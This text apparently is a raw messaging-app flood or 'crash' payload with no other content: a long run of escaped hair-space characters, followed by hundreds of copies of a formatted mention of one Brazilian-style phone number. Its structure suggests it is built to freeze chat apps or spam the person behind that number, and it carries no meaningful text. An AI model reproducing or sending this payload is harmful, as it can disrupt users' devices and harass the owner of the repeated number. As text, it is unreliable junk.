\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A\u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A \u200A *~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~@+5512981791389~*\n*~